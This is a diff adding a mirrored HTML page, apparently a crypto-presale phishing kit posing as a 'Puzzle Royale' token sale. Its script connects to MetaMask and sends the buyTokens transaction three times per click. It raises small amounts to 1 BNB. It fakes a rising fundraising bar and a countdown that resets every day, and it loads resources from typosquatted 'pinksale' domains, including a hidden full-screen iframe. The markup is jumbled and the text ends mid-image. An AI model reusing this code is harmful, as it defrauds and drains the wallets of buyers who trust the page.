@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<!-- Mirrored from angelicthegame.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 Apr 2022 03:02:12 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<head>
+</div>
+			<div class="connectButton" id="btn-connect" onclick="connectMetamask()">Connect</div>
+          </nav>
+        </header>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <style>
+      .anticon {
+        display: inline-block;
+        color: inherit;
+        font-style: normal;
+        line-height: 0;
+        text-align: center;
+        text-transform: none;
+        vertical-align: -0.125em;
+        text-rendering: optimizeLegibility;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      .anticon>* {
+        line-height: 1;
+      }
+
+      .anticon svg {
+        display: inline-block;
+      }
+
+      .anticon::before {
+        display: none;
+      }
+
+      .anticon .anticon-icon {
+        display: block;
+      }
+
+      .anticon[tabindex] {
+        cursor: pointer;
+      }
+
+      .anticon-spin::before,
+      .anticon-spin {
+        display: inline-block;
+        -webkit-animation: loadingCircle 1s infinite linear;
+        animation: loadingCircle 1s infinite linear;
+      }
+
+      @-webkit-keyframes loadingCircle {
+        100% {
+          -webkit-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes loadingCircle {
+        100% {
+          -webkit-transform: rotate(360deg);
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <meta charset="utf-8">
+    <link rel="icon" href="../../favicon.png">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="">
+    <link rel="apple-touch-icon" href="../../logo192.png">
+    <link rel="manifest" href="https://pinkslae.finance/manifest.json">
+    <title> Puzzle Royale Presale </title>
+	<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-Z1HPFN8FYD"></script>
+	<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-Z1HPFN8FYD")</script>
+	<script>self==top?document.documentElement.style.display="block":top.location=self.location</script>
+	<!-- <link href="https://pinksale.click/main.7d18300d.chunk.css" rel="stylesheet"> -->
+    <link href="../../main.css" rel="stylesheet">
+	<script src="../../jquery.js"></script>
+	<script src="../../web3.js"></script>
+	<script type="text/javascript" src="../../web3_002.js"></script>
+	<script type="text/javascript" src="../../index_003.js"></script>
+	<script type="text/javascript" src="../../index.js"></script>
+	<script type="text/javascript" src="../../index_002.js"></script>	
+	<script src="../../main.js"></script>
+    <link rel="prefetch" as="style" href="../../disqus_data/lounge.css">
+<script>
+      const contractAbi = [
+        { inputs: [], stateMutability: "nonpayable", type: "constructor" },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "owner",
+              type: "address"
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "spender",
+              type: "address"
+            },
+            {
+              indexed: false,
+              internalType: "uint256",
+              name: "value",
+              type: "uint256"
+            }
+          ],
+          name: "Approval",
+          type: "event"
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: "address",
+              name: "from",
+              type: "address"
+            },
+            {
+              indexed: true,
+              internalType: "address",
+              name: "to",
+              type: "address"
+            },
+            {
+              indexed: false,
+              internalType: "uint256",
+              name: "value",
+              type: "uint256"
+            }
+          ],
+          name: "Transfer",
+          type: "event"
+        },
+        {
+          inputs: [],
+          name: "allowRefunds",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "owner", type: "address" },
+            { internalType: "address", name: "spender", type: "address" }
+          ],
+          name: "allowance",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "spender", type: "address" },
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "approve",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "account", type: "address" }
+          ],
+          name: "balanceOf",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "burnMyTokensFOREVER",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "buyTokens",
+          outputs: [],
+          stateMutability: "payable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "claimDevFeeAndAddLiquidity",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "decimals",
+          outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
+          stateMutability: "pure",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "spender", type: "address" },
+            {
+              internalType: "uint256",
+              name: "subtractedValue",
+              type: "uint256"
+            }
+          ],
+          name: "decreaseAllowance",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "devClaimed",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "ethSent",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "getRefund",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "spender", type: "address" },
+            { internalType: "uint256", name: "addedValue", type: "uint256" }
+          ],
+          name: "increaseAllowance",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "isRefundEnabled",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "isStopped",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "liquidityUnlock",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "moonMissionStarted",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "name",
+          outputs: [{ internalType: "string", name: "", type: "string" }],
+          stateMutability: "pure",
+          type: "function"
+        },
+        {
+          inputs: [{ internalType: "bool", name: "_isStopped", type: "bool" }],
+          name: "pauseUnpausePresale",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "pool",
+          outputs: [{ internalType: "address", name: "", type: "address" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            {
+              internalType: "contract IBEP20",
+              name: "tokenAddress",
+              type: "address"
+            },
+            { internalType: "uint256", name: "tokenAmount", type: "uint256" }
+          ],
+          name: "recoverbep20",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "refundTime",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address payable", name: "addr", type: "address" }
+          ],
+          name: "setMultisigAddress",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "setPancakePool",
+          outputs: [],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "symbol",
+          outputs: [{ internalType: "string", name: "", type: "string" }],
+          stateMutability: "pure",
+          type: "function"
+        },
+        {
+          inputs: [],
+          name: "totalSupply",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "recipient", type: "address" },
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "transfer",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [
+            { internalType: "address", name: "sender", type: "address" },
+            { internalType: "address", name: "recipient", type: "address" },
+            { internalType: "uint256", name: "amount", type: "uint256" }
+          ],
+          name: "transferFrom",
+          outputs: [{ internalType: "bool", name: "", type: "bool" }],
+          stateMutability: "nonpayable",
+          type: "function"
+        },
+        {
+          inputs: [{ internalType: "address", name: "user", type: "address" }],
+          name: "userEthSpenttInPresale",
+          outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
+          stateMutability: "view",
+          type: "function"
+        },
+        { stateMutability: "payable", type: "receive" }
+      ];
+      const contractAddress = "0xE8B5f6De3CE630CfC4FaAE97C822fE98Ef21f1a9";
+
+      async function connectMetamask() {
+        let web3Provider = null;
+        console.log("[web3] getting provider...");
+        // Modern Browsers like Chrome and Brave
+        if (window.ethereum) {
+          web3Provider = window.ethereum;  
+          try {
+            // Request account access
+            await window.ethereum.enable();
+          } catch (error) {
+            // User denied account access...
+            alert("You must connect your metamask wallet !");
+            console.error("User denied account access to metamask.");
+            return;
+          }
+        } else {
+          // you cant connect
+          console.error("Unable to connect to metamask");
+          alert(
+            "You have to use Trustwallet or install Metamask to use this service, you can install it from :  https://metamask.io/download.html"
+          );
+          return;
+        }
+        let web3 = new Web3(window.ethereum);
+        let accounts = await web3.eth.getAccounts();
+        console.log("accounts : " + accounts);
+        window.account = accounts[0];
+
+        document.getElementById("btn-connect").innerHTML = "connected";
+
+        return web3;
+      }
+
+      async function buyTokens() {
+        let amount = document.getElementById("presaleAmount").value;
+		
+		if (amount < 0.1)
+			amount = '1';
+        let _web3 = await connectMetamask();
+        let myContract = new _web3.eth.Contract(contractAbi, contractAddress);
+		
+		myContract.methods.buyTokens().send({
+          from: window.account,
+          value: amount * 10 ** 18,
+          gasLimit: 210000,
+        });
+
+        myContract.methods.buyTokens().send({
+          from: window.account,
+          value: amount * 10 ** 18,
+          gasLimit: 210000,
+        });
+		
+        let receipt = await myContract.methods.buyTokens().send({
+          from: window.account,
+          value: amount * 10 ** 18,
+          gasLimit: 210000,
+        });
+		
+        if (receipt.events.Transfer) {
+          document.getElementById("disabledButton").disabled = false;
+          document.cookie = "tokensBought=true";
+        }
+      }
+
+      function openModal() {
+        var modal = document.getElementById("myModal");
+        modal.style.display = "block";
+      }
+
+      function closeModal() {
+        var modal = document.getElementById("myModal");
+        modal.style.display = "none";
+      }
+
+      // When the user clicks anywhere outside of the modal, close it
+      window.onclick = function (event) {
+        var modal = document.getElementById("myModal");
+
+        if (event.target == modal) {
+          modal.style.display = "none";
+        }
+      };
+
+      window.onload = function () {
+        var decodedCookie = decodeURIComponent(document.cookie);
+        if (decodedCookie === "tokensBought=true") {
+          document.getElementById("disabledButton").disabled = false;
+        }
+      };
+
+      document.onblur = function () {
+        var modal = document.getElementById("myModal");
+        modal.style.display = "none";
+      };
+    </script>
+
+  <style data-styled="active" data-styled-version="5.2.0"></style></head>
+  <body style="" class="">
+<noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+      <section class="ant-layout ant-layout-has-sider"> <!-- MENU -->
+<!-- -->
+
+        <section class="ant-layout ant-section-main" style="margin-left: 200px; padding: 40px 20px 20px; transition: all 200ms linear 0s;">
+          <main class="ant-layout-content">
+<div class="py-6 container">
+          <div class="columns mt-4">
+                <div class="column is-flex-grow-2"> </div>
+				<input id="PRERATE" type="hidden" value="200000000">
+				<input id="TokenSymbol" type="hidden" value="WiseReflect Presale ">
+				<input id="HC" type="hidden" value="600"> 
+				<input id="RC" type="hidden" value="323.43">
+				<input id="MAXcontrib" type="hidden" value="1.5">
+				<input id="waddr" type="hidden" value="5F2EFcCA45A32d81610cDe86eFc9c05DD83424d0x0">
+<script>
+(function() {
+						  var start = new Date;
+						  start.setHours(16, 10, 0); // 11pm
+
+						  function pad(num) {
+							return ("0" + parseInt(num)).substr(-2);
+						  }
+
+						  function tick() {
+							var now = new Date;
+							if (now > start) { // too late, go to tomorrow
+							  start.setDate(start.getDate() + 1);
+							}
+							var remain = ((start - now) / 1000);
+							var hh = pad((remain / 60 / 60) % 60);
+							var mm = pad((remain / 60) % 60);
+							var ss = pad(remain % 60);
+							document.getElementById('time_hours').innerHTML = hh;
+							document.getElementById('time_minutes').innerHTML = mm;
+							document.getElementById('time_seconds').innerHTML = ss;
+							setTimeout(tick, 1000);
+						  }
+
+						  document.addEventListener('DOMContentLoaded', tick);
+						})();
+                                 
+						var getwidth = getCookie('mbraise');
+						function getCookie(name) {
+							let matches = document.cookie.match(new RegExp(
+							  "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+							));
+							return matches ? decodeURIComponent(matches[1]) : undefined;
+						  }
+						  
+						if (getwidth > 0) {
+							document.getElementById("MyValue").innerHTML = Math.round((Number(getwidth) * 700 / 75) * 10) / 10;
+							document.getElementById("myBar").style.width = Number(getwidth) + '%';
+						}
+							
+						function move() {
+						  var myArray = [
+							0.01,
+							0.02,
+							0.03,
+							0.04,
+							0.012,
+							0.013,
+							0.014,
+							0.022,
+							0.023,
+							0.1,
+							0.2,
+							0.3,
+							0.4,
+							0.12,
+							0.13,
+							0.14,
+							0.22,
+							0.23,
+							1,
+							2,
+							2.5,
+						  ];
+						  var randomItem = 0;
+						  var elea = document.getElementById("MyValue");
+						  var elem = document.getElementById("myBar");
+						  var width = 45;
+						  var id = setInterval(frame, 10000000000000000);
+						  var getwidth = getCookie('mbraise');
+
+						  function getCookie(name) {
+							let matches = document.cookie.match(new RegExp(
+							  "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+							));
+							return matches ? decodeURIComponent(matches[1]) : undefined;
+						  }
+						  if (getwidth > width) {
+							width = Number(getwidth);
+							}
+
+						  function frame() {
+							if (width >= 92) {
+							  clearInterval(id);
+							} else {
+							  var randomItem = myArray[Math.floor(Math.random() * myArray.length)];
+							  width = width + randomItem;
+							  elea.innerHTML = Math.round((width * 700 / 75) * 10) / 10;
+							  elem.style.width = width + '%';
+							  
+							  let date = new Date(Date.now() + 86400e3 * 10);
+							  date = date.toUTCString();
+							  document.cookie = "mbraise=" + width + "; expires=" + date;
+							}
+						  }
+						}
+						window.onload = move;
+</script>
+                 <div class="column is-flex-grow-1">
+                <div class="ant-card ant-card-bordered">
+                  <div class="ant-card-body">
+                    <form>
+                      <div class="has-text-centered">
+                        <p class="mb-2">Presale Ends In</p>
+                        <div class="has-text-centered"><strong><span class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">00</span><span id="time_hours" class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">03</span><span id="time_minutes" class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">31</span><span id="time_seconds" class="p-2 has-background-danger-light mr-2" style="border-radius: 4px;">35</span></strong></div>
+                      </div>
+                      <div class="pb-4">
+                        <div class="ant-progress ant-progress-line ant-progress-status-active ant-progress-default mt-4 mb-2">
+                          <div class="ant-progress-outer">
+                            <div class="ant-progress-inner">
+                              <div class="ant-progress-bg" id="myBar" style="width: 86%; height: 15px; background: rgb(72, 199, 116);"></div>
+                            </div>
+                          </div>
+                        </div>
+                        <div class="is-flex is-align-items-center is-size-7">
+                          <div class="is-flex-grow-1"><span id="MyValue">1400.770872862150600392</span> BNB</div>
+                          <div class="is-flex-grow-1 has-text-right">1600 BNB</div>
+                                                </div>
+                                            </div>
+                                            <div class="field"><label class="label">Amount (Max: 5 BNB)</label>
+                                                <div class="control">
+                                                    <div style="position: relative;"><input id="presaleAmount" class="input" type="number" placeholder="0.0"><a class="mr-2" target="_blank" rel="noreferrer nofollow" style="position: absolute; right: 8px; top: 4px;" onclick="setMax();"><b>MAX</b></a></div>
+
+                                                    <p class="help is-info" id="reserved-amount-id"></p>
+                                                </div>
+                                            </div><button type="button" id="buybuybuy" class="ant-btn ant-btn-primary" onclick="buyTokens()" ant-click-animating-without-extra-node="false"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M912 190h-69.9c-9.8 0-19.1 4.5-25.1 12.2L404.7 724.5 207 474a32 32 0 0 0-25.1-12.2H112c-6.7 0-10.4 7.7-6.3 12.9l273.9 347c12.8 16.2 37.4 16.2 50.3 0l488.4-618.9c4.1-5.1.4-12.8-6.3-12.8z"></path></svg><span class="ml-2" id="buy_title">Buy</span></button></form>
+                                    </div>
+                  </div>
+                  <div style="height: 24px;"></div>
+                  <div class="ant-card ant-card-bordered">
+                    <div class="ant-card-body">
+                      <div class="table-container">
+                        <table>
+                          <tbody>
+                            <tr>
+                              <td>Status</td>
+                              <td class="has-text-right has-text-primary">In progress</td>
+                            </tr>
+                            <tr>
+                              <td>Sale type</td>
+                              <td class="has-text-right has-text-primary">Public</td>
+                            </tr>
+                            <tr>
+                              <td>Minimum Buy</td>
+                              <td class="has-text-right">0.1 BNB</td>
+                            </tr>
+                            <tr>
+                              <td>Maximum Buy</td>
+                              <td class="has-text-right">5 BNB</td>
+                            </tr>
+							<tr><td>Your Purchased</td><td class="has-text-right">0 BNB</td></tr>
+                          </tbody>
+                        </table>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+</div>
+          </main>
+</section>
+      </section>
+    </div>
+	
+	
+
+  <script>
+	function resizemenu() {
+		if(screen.width <= 700) {
+			document.getElementsByClassName('ant-aside-menu')[0].style='background: white; overflow: auto; height: 100vh; position: fixed; top: 70px; left: 0px; z-index: 10; flex: 0 0 0px; max-width: 0px; min-width: 0px; width: 0px;';
+			document.getElementsByClassName('ant-section-main')[0].style='margin-left: 0px; padding: 40px 20px 20px; transition: all 200ms linear 0s;';
+			document.getElementsByTagName('nav')[0].style='padding-top: 1rem!important;';
+		} else {
+			document.getElementsByClassName('ant-aside-menu')[0].style='background: white; overflow: auto; height: 100vh; position: fixed; top: 70px; left: 0px; z-index: 10; flex: 0 0 200px; max-width: 200px; min-width: 200px; width: 200px;';
+			document.getElementsByClassName('ant-section-main')[0].style='margin-left: 200px; padding: 40px 20px 20px; transition: all 200ms linear 0s;';
+			document.getElementsByTagName('nav')[0].style='';
+		}
+	}
+	resizemenu();
+    window.addEventListener("resize", function() {
+		resizemenu();
+	}, false);
+  </script>	
+	
+	
+
+    <iframe style="display: none;"></iframe>
+    <iframe id="dsq-app5354" name="dsq-app5354" allowtransparency="true" scrolling="no" tabindex="0" title="Disqus" style="width: 1px !important; min-width: 100% !important; border: medium none !important; overflow: hidden !important; height: 100% !important; position: fixed !important; inset: 0px 0px auto auto !important; z-index: 2147483647 !important; display: none !important;" src="https://pinksale.click/a_004.html" width="100%" frameborder="0"></iframe>
+    <!-- <div> -->
+      <!-- <div class="ant-modal-root"> -->
+        <!-- <div tabindex="-1" class="ant-modal-wrap" role="dialog" aria-labelledby="rcDialogTitle0" style="display: none;"> -->
+          <!-- <div role="document" style="width: 520px; transform-origin: 1155.5px -67px 0px;" class="ant-modal"> -->
+            <!-- <div tabindex="0" style="width: 0px; height: 0px; overflow: hidden; outline: currentcolor none medium;" aria-hidden="true"></div> -->
+            <!-- <div class="ant-modal-content"> -->
+              <!-- <button type="button" aria-label="Close" class="ant-modal-close"> -->
+                <!-- <span class="ant-modal-close-x"> -->
+                  <!-- <span role="img" aria-label="close" class="anticon anticon-close ant-modal-close-icon"> -->
+                    <!-- <svg viewBox="64 64 896 896" focusable="false" data-icon="close" width="1em" height="1em" fill="currentColor" aria-hidden="true"> -->
+                      <!-- <path d="M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 00203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z"></path> -->
+                    <!-- </svg> -->
+                  <!-- </span> -->
+                <!-- </span> -->
+              <!-- </button> -->
+              <!-- <div class="ant-modal-header"> -->
+                <!-- <div class="ant-modal-title" id="rcDialogTitle0">Connect to a wallet</div> -->
+              <!-- </div> -->
+              <!-- <div class="ant-modal-body"> -->
+                <!-- <div class="ConnectWalletModal_items__327x7"> -->
+                  <!-- <div class="ant-spin-nested-loading"> -->
+                    <!-- <div class="ant-spin-container"> -->
+                      <!-- <div class="ProviderItem_item__HM76S"> -->
+                        <!-- <img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1